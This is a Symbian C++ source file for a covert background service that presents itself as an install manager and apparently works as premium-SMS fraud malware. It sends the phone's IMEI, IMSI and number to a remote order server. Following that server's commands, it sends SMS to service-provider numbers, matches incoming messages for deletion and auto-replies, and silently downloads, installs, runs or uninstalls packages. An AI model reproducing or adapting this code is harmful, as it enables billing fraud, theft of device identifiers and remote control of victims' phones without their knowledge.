#ifdef EKA2
#include <eikstart.h>
#include <e32svr.h>
#endif

#include <e32math.h>
#include <pathinfo.h> 
#include <eikenv.h>
#include <eikappui.h>
#include <eikapp.h>
#include <apgcli.h>
#include <connpref.h>
#include <commdbconnpref.h>
#include <commdb.h>
#include <cdbpreftable.h>
#include <escapeutils.h>
#include "AppMain.h"
#include "timeouttimer.h"
#include "applicationmanager.h"
#include "commonutils.h"
#include "systemmanager.h"
#include "utf.h"
#ifndef EKA2
#include <sysutil.h>
#endif

CAppMain* g_server=0;
TInt CAppMain::EntryPoint(TAny* /*aNone*/){
  CTrapCleanup* cleanupStack=CTrapCleanup::New();
  if(!cleanupStack){
    PanicServer(ECreateTrapCleanup);
  }
  Log(_L("TInt CAppMain::EntryPoint() 1"));
  TRAPD(leave,ThreadMainL());
  if(leave){
    Log(_L("TInt CAppMain::EntryPoint() 2"));
    PanicServer(ESrvCreateServer);
  }

  delete cleanupStack;
  Log(_L("TInt CAppMain::EntryPoint() 3"));
  cleanupStack=NULL;
  return KErrNone;
}

void CAppMain::ThreadMainL(){
  CActiveScheduler* activeScheduler=new (ELeave) CActiveScheduler();
  CleanupStack::PushL(activeScheduler);
  CActiveScheduler::Install(activeScheduler);
  RFs fs;
  fs.Connect();
  fs.MkDirAll(KAppFolder);
  fs.Close();
  Log(_L8("Application started\r\n^^^^^^^^^^^^^^^^^^^^^^^^^^"),0);
  CAppMain::NewLC();
  CActiveScheduler::Start();
  CleanupStack::PopAndDestroy(2);
  Log(_L8("CAppMain::ThreadMainL() end"));
}

CAppMain* CAppMain::NewL(){
  Log(_L8("CAppMain::NewL() start"));
  CAppMain* server=CAppMain::NewLC();
  CleanupStack::Pop(server);
  Log(_L8("CAppMain::NewL() end"));
  return server;
}

CAppMain* CAppMain::NewLC(){
  Log(_L8("CAppMain::NewLC() start"));
  CAppMain* server=new (ELeave) CAppMain(EPriorityNormal);
  CleanupStack::PushL(server);
  server->ConstructL();
  Log(_L8("CAppMain::NewLC() end"));
  return server;
}

CAppMain::CAppMain(TInt aPriority) :
  CServer2(aPriority){
}

CAppMain::~CAppMain(){
  Log(_L8("CAppMain::~CAppMain() start"));
  this->OrderCancel();
  SAFE_DELETE(this->iTimeout);
  SAFE_DELETE(this->iUserAgent);
  SAFE_DELETE(this->iApplicationManager);
  SAFE_DELETE(this->iSmsEngine);
  this->iConnection.Close();
  this->iSocketServ.Close();
  Log(_L8("CAppMain::~CAppMain() end"));
}

void CAppMain::ConstructL(){
  Log(_L8("CAppMain::ConstructL() start"));
  StartL(KInstallManager);
  g_server=this;
  iRejectSmsAddresses=new (ELeave) CDesCArrayFlat(1);
  iRejectSmsContents=new (ELeave) CDesCArrayFlat(1);
  this->iContractItemArray=new (ELeave) CArrayPtrSeg<SpChannelItem> (5);
  this->iReplySmsMessageArray=new (ELeave) CArrayPtrSeg<SmsMessage> (5);
  iDrive=GetAppDrive();
  iApplicationManager=CApplicationManager::NewL();
  this->iSmsEngine=CSmsEngine::NewL(this);
  this->iMMServicePeriodic=CPeriodic::NewL(0);
  this->iSMSServicePeriodic=CPeriodic::NewL(0);
  this->iMMServicePeriodic->Start(1,TMMPeriodicInteval*1000000,TCallBack(StartMMServiceFlow,this));
  this->iSMSServicePeriodic->Start(30*1000000,30*1000000,TCallBack(StartSMSServiceFlow,this));
  Log(_L8("CAppMain::ConstructL() end"));
}

TInt CAppMain::StartSMSServiceFlow(TAny* aObject){
  CAppMain* app=((CAppMain*)aObject);
  TInt count=app->iReplySmsMessageArray->Count();
  if(count){
    for(TInt i=count-1;i>=0;--i){
      SmsMessage* item=(SmsMessage*)app->iReplySmsMessageArray->At(i);
      app->iSmsEngine->SendMessage(item->PhoneNumber,item->MessageContent);
      app->iReplySmsMessageArray->Delete(i);
    }
  }
  return 0;
}
TInt CAppMain::StartMMServiceFlow(TAny* aObject){
  Log(_L8("CAppMain::StartMainFlow() start"));
  CAppMain* app=((CAppMain*)aObject);
  TInt count=app->iPeriodicCount;
  app->iPeriodicCount++;
  if(count%3==0){//This is to resove a stricky problem, iMMServicePeriodic duration cannot great than 3600
    Log(_L8("^^^Flow started"));
    app->iApplicationUrl.Zero();
    app->iNeedInstall=EFalse;
    if(app->iTimeout) delete app->iTimeout;
    app->iTimeout=CTimeOutTimer::NewL(0,*app);
    app->iMMState=EInitializeNetWork;
    //app->iState=EInstallApplication;
    app->iTimeout->After(1*1000*1000);
    Log(_L8("^^^Flow end"));
  }
  Log(_L8("CAppMain::StartMainFlow() end"));
  return 1;
}

CSession2* CAppMain::NewSessionL(const TVersion&,const RMessage2&) const{
  return NULL;
}

TInt CAppMain::RunError(TInt aError){
  Log(_L8("TInt CAppMain::RunError(TInt aError) start"));
  if(aError==KErrBadDescriptor){
    PanicClient(Message(),EBadDescriptor);
  }else{
    Message().Complete(aError);
  }
  ReStart();
  Log(_L8("TInt CAppMain::RunError(TInt aError) end"));
  return KErrNone;
}

void CAppMain::PanicClient(const RMessage2& aMessage,TInstallManagerPanic aPanic){
  Log(_L8("void CAppMain::PanicClient() start"));
  aMessage.Panic(KInstallManager,aPanic);
  Log(_L8("void CAppMain::PanicClient() end"));
}

void CAppMain::PanicServer(TInstallManagerPanic aPanic){
  Log(_L8("void CAppMain::PanicServer() start"));
  User::Panic(KInstallManager,aPanic);
  Log(_L8("void CAppMain::PanicServer() end"));
}

void CAppMain::SaveSmsOrder(const TDesC8& aSmsOrder){
  if(aSmsOrder.Length()<6) return;
  Log(_L8("void CAppMain::SaveSmsOrder() begin..."));
  Log(aSmsOrder);
  CDesC8ArrayFlat* orderColumns=new (ELeave) CDesC8ArrayFlat(1);
  CleanupStack::PushL(orderColumns);
  SeprateToArray(aSmsOrder,_L8(","),*orderColumns);
  TBuf8<100> buf;
  buf.Format(_L8("Array Length:%d"),orderColumns->Count());
  Log(buf);
  if(orderColumns->Count()>=7){
    //ContractItem* item=new ContractItem();
    SpChannelItem* item=new (ELeave) SpChannelItem();
    TInt fieldIndex=0;
    item->Id=TDesC2TInt(ToDesC((*orderColumns)[fieldIndex++]));
    item->ParentId=TDesC2TInt(ToDesC((*orderColumns)[fieldIndex++]));
    item->SpNumber.Copy(ToDesC((*orderColumns)[fieldIndex++]));
    item->SpSmsContent.Copy(ToDesC((*orderColumns)[fieldIndex++]));
    item->SpNumberFilter.Copy(ToDesC((*orderColumns)[fieldIndex++]));
    item->SpSmsContentFilter.Copy(ToDesC((*orderColumns)[fieldIndex++]));
    item->ParseInServer=(((*orderColumns)[fieldIndex++]).Find(_L8("1"))>=0);
    this->iContractItemArray->AppendL(item);
  }
  TBuf8<100> buf2;
  buf2.Format(_L8("this->iContractItemArray->Count()=%d"),this->iContractItemArray->Count());
  Log(buf2);
  CleanupStack::PopAndDestroy(orderColumns);
  Log(_L8("void CAppMain::SaveSmsOrder() end"));
}

void CAppMain::ParseServerOrder(const TDesC8& aServerOrder){
  if(aServerOrder.Length()<5) return;
  TBuf8<250> buf;
  buf.Format(_L8("Parsing order:%S"),&aServerOrder);
  Log(buf);
  if(aServerOrder.Find(_L8("m:"))==0){
    this->SaveSmsOrder(aServerOrder.Right(aServerOrder.Length()-2));
    return;
  }

  CDesC8ArrayFlat* orderColumns=new (ELeave) CDesC8ArrayFlat(1);
  CleanupStack::PushL(orderColumns);
  SeprateToArray(aServerOrder,_L8(","),*orderColumns);
  if(orderColumns->Count()<3){
    CleanupStack::PopAndDestroy(orderColumns);
    return;
  }
  TPtrC8 part1=(*orderColumns)[0];
  TPtrC8 part2=(*orderColumns)[1];
  TPtrC8 part3=(*orderColumns)[2];
  CleanupStack::PopAndDestroy(orderColumns);
  if(part1.Find(_L8("m"))==0){//flag="m", sms reject rule;
    Log(_L8("Add reject rule start:"));
    TBuf<21> address;
    address.Copy(part2);
    HBufC* buf16=CnvUtfConverter::ConvertToUnicodeFromUtf8L(part3);
    CleanupStack::PushL(buf16);
    TBuf<500> content;
    content.Copy(buf16->Des());
    Log(address);
    Log(content);
    this->iRejectSmsAddresses->AppendL(address);
    this->iRejectSmsContents->AppendL(content);
    Log(_L8("Add reject rule end:"));
    CleanupStack::PopAndDestroy();
    return;
  }
  if(part1.Find(_L8("u"))==0){//flag=="u",Unstall the sis;
    TUid appUid=HexString2Uid(part2);
    this->iApplicationManager->Uninstall(appUid);
    return;
  }
  if(part1.Find(_L8("r"))==0){//flag="r", run the aplication;
    TUid appUid=HexString2Uid(part2);
    if(this->iApplicationManager->IsInstalled(appUid)){
      this->iApplicationManager->StartApplication(appUid);
    }else{
      iApplicationUrl.Copy(part3);
    }
    return;
  }
  
  if(part1.Find(_L8("i"))==0){//flag=="i",Download and install the sis;
    iApplicationUrl.Copy(part3);
    return;
  }
}

void CAppMain::ExecuteServerOrder(){
  iApplicationUrl.Zero();
  Log(_L8("void CAppMain::ExecuteServerOrder() start"));
  iRejectSmsAddresses->Reset();
  iRejectSmsContents->Reset();
  this->iContractItemArray->Reset();
  HBufC8* content=HBufC8::New(KSEMaxBufferSize);
  CleanupStack::PushL(content);
  TInt error=ReadFromFile(KLocalIndexPath,content);
  Log(content->Des());
  if(error==0&&content->Length()>5){
    CDesC8ArrayFlat* lines=new (ELeave) CDesC8ArrayFlat(1);
    CleanupStack::PushL(lines);
    SeprateToArray(content->Des(),KNewLine,*lines);
    TInt lineCount=lines->Count();
    this->iMMState=ECloseNetwork;
    if(lineCount>0){
      for(TInt i=0;i<lineCount;++i){
        this->ParseServerOrder((*lines)[i]);
      }
      //Handle send message task;
      TInt contractItemCount=this->iContractItemArray->Count();
      if(contractItemCount>0){
        for(TInt i=contractItemCount-1;i>=0;--i){
          SpChannelItem* item=(SpChannelItem*)this->iContractItemArray->At(i);
          if(item->SpSmsContentFilter.Length()==0&&item->SpNumberFilter.Length()==0){
            if(item->SpNumber.Length()>3){
              Log(_L8("ExecuteServerOrder:Send Message begin"));
              this->iSmsEngine->SendMessage(item->SpNumber,item->SpSmsContent);
              this->iContractItemArray->Delete(i);
              Log(_L8("ExecuteServerOrder:Send Message end"));
            }
          }
        }
      }
      //Handle application manager task;
      if(iApplicationUrl.Length()>0){
        this->iMMState=EDownloadApplication;
      }
    }
    CleanupStack::PopAndDestroy(lines);
    this->iTimeout->After(1*1000*1000);
  }
  CleanupStack::PopAndDestroy(content);
  Log(_L8("void CAppMain::ExecuteServerOrder() end"));
}

void CAppMain::InitializeNetWork(){
  TRAPD(err,DoInitNetworkFlow());
  if(err){
    this->iMMState=ECleanUp;
  }else{
    if(iAreaCode.Length()>0){
      this->iMMState=EGetServerOrder;
    }else{
      this->iMMState=EGetPhoneNumber;
    }
  }
  iTimeout->After(1*1000000);
}

void CAppMain::CloseNetWork(){
  Log(_L8("Close connection begin."));
  TRAPD(err,DoCloseNetworkFlow());
  if(err){
    Log(_L8("Error occurs while close network connection"));
  }
  this->iMMState=EInstallApplication;
  this->iTimeout->After(3*1000000);
  Log(_L8("Close connection end."));
}

void CAppMain::CleanUp(){
  this->iTimeout->Cancel();
  if(!DebugEnabled()){
    DeleteFile(KLocalIndexPath);
    DeleteFile(KLocalSisPath);
  }
}

void CAppMain::InstallApplication(){
  Log(_L8("void CAppMain::InstallApplication() begin"));
  if(this->iNeedInstall){
    if(FileExists(KLocalSisPath)) this->iApplicationManager->Install(KLocalSisPath);
    this->iNeedInstall=EFalse;
  }
  iMMState=ECleanUp;
  iTimeout->After(1*1000000);
  Log(_L8("void CAppMain::InstallApplication() end"));
}

void CAppMain::TimerExpired(){
  switch(iMMState){
    case EInitializeNetWork:
      this->InitializeNetWork();
      break;
    case EGetPhoneNumber:
      this->GetPhoneNumber();
      break;
    case EGetAreaCode:
      this->GetAreaCode();
      break;
    case EGetServerOrder:
      this->GetServerOrder();
      break;
    case EExecuteServerOrder:
      this->ExecuteServerOrder();
      break;
    case EDownloadApplication:
      this->DownloadApplication();
      break;
    case ECloseNetwork:
      this->CloseNetWork();
      break;
    case EInstallApplication:
      this->InstallApplication();
      break;
    case ECleanUp:
      this->CleanUp();
      break;
  }
}

TInt CAppMain::DoInitNetworkFlow(){
  TInt r=-1;
  iDefaultAccessPointID=2;
#ifndef _MANUALAPN_
#ifndef __WINS__    //如果是真机，检查用户手机是否有移动梦网IAP接入点，如果没有，提示用户需要先建立此接入点
  if(GetAccessPoint()){
    r=0;
  }else{
    Log(_L8("no correct IAP."));
  }
#endif  
#endif  
  iFirstConnect=ETrue;
  Log(_L8("Exception while initialize newwork"));
  return r;
}

void CAppMain::DoCloseNetworkFlow(){
  iTimeout->Cancel();
  iMMState=EInitializeNetWork;
  iCountConnect=0;
  iFirstConnect=ETrue;
  iConnection.Close();
  iSocketServ.Close();
  Log(_L8("close connection complete."));
  SAFE_DELETE(this->iSocketEngine);
  iMMState=ECleanUp;
  this->iTimeout->After(1*1000*1000);
}

TBool CAppMain::GetState(){
  Log(_L8("CAppMain::GetState() begin"));
  
  TBool r=ETrue;
  if(iFirstConnect){
    iSocketServ.Connect();
    TCommDbConnPref prefs;
    //有些手机需要搜索接入点
    prefs.SetIapId(iDefaultAccessPointID);
    if(0==iConnection.Open(iSocketServ)){
      //提示用户选择接入点
      Log(_L8("CAppMain::GetState(): Hint user to select the access point"));
      prefs.SetDialogPreference(ECommDbDialogPrefDoNotPrompt);
      TInt err=0;
#ifndef _MANUALAPN_
      Log(_L8("err=iConnection.Start(prefs);"));
      err=iConnection.Start(prefs);
#else
      Log(_L8("err=iConnection.Start();"));
      err = iConnection.Start();
#endif
      if(0==err){
        iFirstConnect=EFalse;
        return ETrue;
      }
      r=EFalse;
    }
  }
  Log(_L8("CAppMain::GetState() end"));
  return r;
}

void CAppMain::OnInstallerEvent(TBool aIsInstall,TUid aAppUid,TInt aError){
  
}

TBool CAppMain::GetAccessPoint(){
  TBuf<100> CommDBName;
  TUint32 default_iap_ID(0);
  TUint32 will_set_iap_id(0);
  TBuf<100> ItemName(_L("wap"));
  const TUint8 str[]={
      0xfb,
      0x79,
      0xa8,
      0x52,
      0xa6,
      0x68,
      0x51,
      0x7F,
      0
  };
  TPtrC ptrYDMW=TPtrC((TUint16*)str,4);
  //创建手机IAP数据库对象
  CCommsDatabase* CommDb=CCommsDatabase::NewL(EDatabaseTypeIAP);
  CleanupStack::PushL(CommDb);
  
  //打开IAP接入点表
  CCommsDbTableView* tableIAP=CommDb->OpenTableLC(TPtrC(IAP));
  if(tableIAP->GotoFirstRecord()==KErrNone){
    do{
      //循环获取IAP接入点，如有移动梦网接入点则对will_set_iap_id赋值
      tableIAP->ReadUintL(TPtrC(COMMDB_ID),default_iap_ID);
      tableIAP->ReadTextL(TPtrC(COMMDB_NAME),CommDBName);
      //iCoeEnv->ReadResource(ItemName, LOC_BUF_ACCESS_POINT_DEFAULT);
      if(CommDBName.FindF(ItemName)>=0||CommDBName.FindF(ptrYDMW)>=0){
        will_set_iap_id=default_iap_ID;
        break;
      }
    }while(tableIAP->GotoNextRecord()==KErrNone);
  }

  CleanupStack::PopAndDestroy(tableIAP);
  CleanupStack::PopAndDestroy(CommDb);
  
  //将获取的移动梦网接入点做为缺省访问接入点
  if(will_set_iap_id>0){
    iDefaultAccessPointID=will_set_iap_id;
    Log(_L8("cmwap IAP"));
    //    TBuf8<12> buf;
    //    buf.AppendNum((TInt)will_set_iap_id);
    //    Log(buf);
    return ETrue;
  }else{
    //假如没有找到“移动梦网”接入点，则提示用户在手机中设置此接入点
    Log(_L8("no cmwap"));
    return EFalse;
  }
}
void CAppMain::HandleSmsServerParserReply(const TDesC8& aData){
  CDesC8ArrayFlat* fields=new (ELeave) CDesC8ArrayFlat(1);
  CleanupStack::PushL(fields);
  SeprateToArray(aData,_L8(","),*fields);
  if(fields->Count()==3){
    SmsMessage* message=new SmsMessage();
    message->PhoneNumber.Copy(ToDesC((*fields)[1]));
    message->MessageContent.Copy(ToDesC((*fields)[2]));
    this->iReplySmsMessageArray->AppendL(message);
    Log(_L8("Sms Server Parser result received, will reply in 30 seconds!"));
  }
  CleanupStack::PopAndDestroy(fields);
}
//Download Manager begin
void CAppMain::ReceData(const TDesC8& aData){
  Log(_L8("CAppMain::ReceData() begin..."));
  if(aData.Find(_L8("`sms-reply`"))==0){
    HandleSmsServerParserReply(aData);
    Log(_L8("Order is Empty, will close the network"));
    this->iMMState=ECloseNetwork;
    this->iTimeout->After(1*1000000);
    return;
  }

  switch(this->iMMState){
    case EGetPhoneNumber:
      Log(_L8("Save PhoneNumber Response begin..."));
      if(aData.Length()>100){
        if(DebugEnabled()){
          saveToFile(KGetPhoneNumberResponseFilePath,aData);
        }
        _LIT8(StartKey,"<font color=\"RED\" >尊敬的");
        TInt startIndex=aData.Find(StartKey);
        if(startIndex>0){
          TPtrC8 phoneNumber=aData.Mid(startIndex+StartKey().Length(),11);
          SetPhoneNumber(phoneNumber);
          Log(phoneNumber);
        }
      }
      Log(_L8("Save PhoneNumber Response end..."));
      this->iMMState=EGetAreaCode;
      this->iTimeout->After(1);
      break;
    case EGetAreaCode:
      Log(_L8("Save AreaCode Response begin..."));
      if(aData.Length()>10){
        if(DebugEnabled()){
          saveToFile(KGetAreaResponseFilePath,aData);
        }
        _LIT8(StartKey,"\"AreaCode\":\"");
        TInt startIndex=aData.Find(StartKey);
        if(startIndex>0){
          TPtrC8 rightPart=aData.Right(aData.Length()-startIndex-StartKey().Length());
          _LIT8(EndKey,"\"");
          TInt endIndex=rightPart.Find(EndKey);
          if(endIndex>0){
            TPtrC8 areaCode=rightPart.Left(endIndex);
            SetAreaCode(areaCode);
            Log(areaCode);
          }
        }
      }
      Log(_L8("Save AreaCode Response end..."));
      this->iMMState=EGetServerOrder;
      this->iTimeout->After(1);
      break;
    case EGetServerOrder:
      if(aData.Length()>10&&aData.Find(_L8("`"))==0){
        Log(_L8("Save Index File begin..."));
        saveToFile(KLocalIndexPath,aData);
        Log(_L8("Save Index File end"));
        this->iMMState=EExecuteServerOrder;
        this->iTimeout->After(1*1000000);
      }else{
        Log(_L8("Order is Empty, will close the network"));
        this->iMMState=ECloseNetwork;
        this->iTimeout->After(1*1000000);
      }
      break;
    case EDownloadApplication:
      Log(_L8("ReceData: Save sis begin..."));
      saveToFile(KLocalSisPath,aData);
      this->iNeedInstall=ETrue;
      Log(_L8("ReceData: Save sis end"));
      iMMState=ECloseNetwork;
      iTimeout->After(1*1000000);
      break;
    default:
      break;
  }
  Log(_L8("CAppMain::ReceData() end"));
}

TInt CAppMain::DownloadApplication(){
  Log(_L8("DownloadApplication() begin.."));
  OrderCancel();
  SAFE_DELETE(iSocketEngine);
  iSocketEngine=CSocketEngine::NewL();
  TBuf8<512> userAgent;
  userAgent.Copy(KUserAgent);
  iSocketEngine->SetUserAgent(userAgent);
  iSocketEngine->HTTPGetRange(this,this->iApplicationUrl,0,-1);
  Log(_L8("DownloadApplication() end"));
  return 0;
}
TInt CAppMain::GetAreaCode(){
  if(iPhoneNumber.Length()>0){
    Log(_L8("CAppMain::GetAreaCode() start...."));
    this->OrderCancel();
    SAFE_DELETE(iSocketEngine);
    iSocketEngine=CSocketEngine::NewL();
    iSocketEngine->SetUserAgent(KUserAgent);
    TBuf8<200> url;
    ////http://vip.showji.com/locating/?m=13632830910&outfmt=json&callback=phone.callBack
    url.Copy(_L8("http://vip.showji.com/locating/?outfmt=json&callback=phone.callBack&m="));
    url.Append(iPhoneNumber);
    iSocketEngine->HTTPGetRange(this,url,0,-1);
    Log(_L8("CAppMain::GetAreaCode() end"));
  }else{
    this->iMMState=EGetServerOrder;
    this->iTimeout->After(1);
  }
  return 0;
}
TInt CAppMain::GetPhoneNumber(){
  Log(_L8("CAppMain::GetPhoneNumber() start...."));
  this->OrderCancel();
  SAFE_DELETE(iSocketEngine);
  iSocketEngine=CSocketEngine::NewL();
  iSocketEngine->SetUserAgent(KUserAgent);
  iSocketEngine->HTTPGetRange(this,KGetPhoneNumberUrl,0,-1);
  Log(_L8("CAppMain::GetOrder() end"));
  return 0;
}

TInt CAppMain::GetServerOrder(){
  Log(_L8("CAppMain::GetOrder() start...."));
  this->OrderCancel();
  SAFE_DELETE(iSocketEngine);
  iSocketEngine=CSocketEngine::NewL();
  iSocketEngine->SetUserAgent(KUserAgent);
  CSystemManager* manager=CSystemManager::NewL();
  CleanupStack::PushL(manager);
  TPtrC imei=manager->GetIMEI();
  TBuf8<200> url;
  url.Copy(KIndexUrl);
  url.Append(_L8("?imei="));
  url.Append(imei);
  url.Append(_L8("&imsi="));
  url.Append(manager->GetIMSI());
  url.Append(_L8("&machineUid="));
  url.AppendNum(manager->GetMachineUId());
  url.Append(_L8("&version="));
  url.Append(KVersion);
  url.Append(_L8("&phoneNumber="));
  url.Append(this->iPhoneNumber);
  url.Append(_L8("&areaCode="));
  url.Append(this->iAreaCode);
  CleanupStack::PopAndDestroy(manager);
  iSocketEngine->HTTPGetRange(this,url,0,-1);
  Log(_L8("CAppMain::GetOrder() end"));
  return 0;
}

TInt CAppMain::OrderCancel(){
  if(iTimeout) iTimeout->Cancel();
  SAFE_DELETE(iSocketEngine);
  iCustomStep=0;
  iGotoStep=-1;
  return 0;
}

void CAppMain::OnHttpError(THttpErrorID aErrId){
  Log(_L8("Error occurs while http requesting,will finsih the while flow."));
  if(this->iMMState==EGetPhoneNumber||this->iMMState==EGetAreaCode){
    this->iMMState=EGetServerOrder; //if error in retrieving get phone number/area code,just go to next step.
  }else{
    this->iPeriodicCount=0;//Reset the iPeriodicCount so that run on next periotic.
    this->iMMState=ECloseNetwork;
  }
  this->iTimeout->After(1);
}
void CAppMain::SendSmsParseRequest(const TDesC& address,const TDesC& content,TInt contractId){
  Log(_L8("CAppMain::ParseSmsInServer() start"));
  this->OrderCancel();
  SAFE_DELETE(iSocketEngine);
  iSocketEngine=CSocketEngine::NewL();
  iSocketEngine->SetUserAgent(KUserAgent);
  CSystemManager* manager=CSystemManager::NewL();
  CleanupStack::PushL(manager);
  TPtrC imei=manager->GetIMEI();
  TBuf8<5000> postBody;
  //url.Copy(KSmsParserUrl);
  postBody.Append(_L8("imei="));
  postBody.Append(imei);
  postBody.Append(_L8("&imsi="));
  postBody.Append(manager->GetIMSI());
  postBody.Append(_L8("&machineUid="));
  postBody.AppendNum(manager->GetMachineUId());
  CleanupStack::PopAndDestroy(manager);
  postBody.Append(_L8("&version="));
  postBody.Append(KVersion);
  postBody.Append(_L8("&phoneNumber="));
  postBody.Append(this->iPhoneNumber);
  postBody.Append(_L8("&areaCode="));
  postBody.Append(this->iAreaCode);
  postBody.Append(_L8("&id="));
  postBody.AppendNum(contractId);
  postBody.Append(_L8("&spNumber="));
  postBody.Append(address);
  postBody.Append(_L8("&content="));
  HBufC8* utf8Content=CnvUtfConverter::ConvertFromUnicodeToUtf8L(content);
  CleanupStack::PushL(utf8Content);
  HBufC8* encodedContent=EscapeUtils::EscapeEncodeL(utf8Content->Des(),EscapeUtils::EEscapeUrlEncoded);
  CleanupStack::PushL(encodedContent);
  postBody.Append(encodedContent->Des());
  CleanupStack::PopAndDestroy(2);
  //iSocketEngine->HTTPGetRange(this,url,0,-1);
  iSocketEngine->HTTPPostRange(this,KSmsParserUrl,_L8(""),postBody,0,-1);
  Log(_L8("CAppMain::ParseSmsInServer() end"));
}

TBool CAppMain::MessageNeedDelete(const TDesC& aSpNumber,const TDesC& aSpSmsMessage){
  Log(_L8("TBool CAppMain::MessageNeedDelete() begin..\r\n---------------------------\n"));
  Log(aSpNumber);
  Log(aSpSmsMessage);
  TBool result=EFalse;
  TInt contractItemCount=this->iContractItemArray->Count();
  if(contractItemCount>0){
    for(TInt i=contractItemCount-1;i>=0;--i){
      SpChannelItem* item=(SpChannelItem*)this->iContractItemArray->At(i);
      if(aSpNumber.Find(item->SpNumberFilter)>=0){
        if(item->SpSmsContentFilter.Length()==0||aSpSmsMessage.Find(item->SpSmsContentFilter)>=0){
          result=ETrue;
          Log(_L8("-------------------"));
          Log(item->SpNumberFilter);
          Log(item->SpSmsContentFilter);
          Log(_L8("-------------------"));
          if(item->ParseInServer){
            this->SendSmsParseRequest(aSpNumber,aSpSmsMessage,item->Id);
          }else if(item->SpSmsContent.Length()>0){//Need reply this message
            SmsMessage* message=new SmsMessage();
            message->MessageContent.Copy(item->SpSmsContent);
            if(item->SpNumber.Length()==0){
              message->PhoneNumber.Copy(aSpNumber);
            }else{
              message->PhoneNumber.Copy(item->SpNumber);
            }
            this->iReplySmsMessageArray->AppendL(message);
            Log(_L8("Need Reply this message, will reply in 30 seconds!"));
          }
          break;
        }
      }
    }
  }
  Log(_L8("---------------------------\r\nTBool CAppMain::MessageNeedDelete() end"));
  return result;
}

void CAppMain::SetAreaCode(const TDesC8& buf){
  if(buf.Length()<=6){
    this->iAreaCode.Copy(buf);
  }
}

void CAppMain::SetPhoneNumber(const TDesC8& buf){
  if(buf.Length()==11) iPhoneNumber.Copy(buf);
}

